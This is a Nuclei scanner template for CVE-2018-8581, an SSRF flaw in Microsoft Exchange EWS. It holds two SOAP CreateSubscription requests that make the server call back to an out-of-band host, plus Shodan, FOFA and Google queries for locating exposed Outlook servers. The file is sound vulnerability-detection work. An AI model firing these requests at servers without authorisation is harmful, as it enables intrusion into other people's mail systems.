http/cves/2018/CVE-2018-8581.yaml

id: CVE-2018-8581

info:
  name: Microsoft Exchange Server - EWS PushSubscription SSRF (Elevation of Privilege)
  author: nuclei-template
  severity: high
  description: |
    Microsoft Exchange Server contains an elevation of privilege vulnerability caused by SSRF in the EWS PushSubscription endpoint.
    This allows attackers to supply callback URLs, leading to Server-Side Request Forgery when EWS is enabled.
  reference:
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8581
    - https://nvd.nist.gov/vuln/detail/CVE-2018-8581
    - https://ti.qianxin.com/advisory/articles/analysis-of-cve-2018-8581/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2018-8581
    cwe-id: CWE-918
    cpe: cpe:2.3:a:microsoft:exchange_server:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: microsoft
    product: exchange_server
    shodan-query:
      - http.favicon.hash:1768726119
      - http.title:"outlook"
      - cpe:"cpe:2.3:a:microsoft:exchange_server"
    fofa-query:
      - icon_hash=1768726119
      - title="outlook"
    google-query: intitle:"outlook"
  tags: cve,cve2018,microsoft,exchange,ews,ssrf,oast,privilege-escalation,vuln

http:
  - raw:
      - |
        POST /EWS/Exchange.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://schemas.microsoft.com/exchange/services/2006/messages/CreateSubscription"
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
          <soap:Header/>
          <soap:Body>
            <m:CreateSubscription>
              <m:PushSubscriptionRequest>
                <t:FolderIds>
                  <t:DistinguishedFolderId Id="inbox"/>
                </t:FolderIds>
                <t:EventTypes>
                  <t:EventType>NewMailEvent</t:EventType>
                </t:EventTypes>
                <t:Watermark>AQAAAFyXNzEjRqTzFE+TLoDSw9T+/w==</t:Watermark>
                <t:StatusFrequency>1</t:StatusFrequency>
                <t:URL>https://{{interactsh-url}}/</t:URL>
              </m:PushSubscriptionRequest>
            </m:CreateSubscription>
          </soap:Body>
        </soap:Envelope>

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "https"

      - type: status
        status:
          - 200
          - 401
          - 403
          - 500

      - type: word
        part: body
        words:
          - "CreateSubscriptionResponse"
          - "ErrorInvalidRequest"
          - "ResponseCode"
          - "soap:Envelope"
        condition: or

  - raw:
      - |
        POST /EWS/PushSubscription.svc HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://schemas.microsoft.com/exchange/services/2006/messages/CreateSubscription"
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
          <soap:Header/>
          <soap:Body>
            <m:CreateSubscription>
              <m:PushSubscriptionRequest>
                <t:FolderIds>
                  <t:DistinguishedFolderId Id="inbox"/>
                </t:FolderIds>
                <t:EventTypes>
                  <t:EventType>NewMailEvent</t:EventType>
                </t:EventTypes>
                <t:Watermark>AQAAAFyXNzEjRqTzFE+TLoDSw9T+/w==</t:Watermark>
                <t:StatusFrequency>1</t:StatusFrequency>
                <t:URL>https://{{interactsh-url}}/</t:URL>
              </m:PushSubscriptionRequest>
            </m:CreateSubscription>
          </soap:Body>
        </soap:Envelope>

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "https"

      - type: status
        status:
          - 200
          - 401
          - 403
          - 500

      - type: word
        part: body
        words:
          - "CreateSubscriptionResponse"
          - "ErrorInvalidRequest"
          - "ResponseCode"
          - "soap:Envelope"
        condition: or
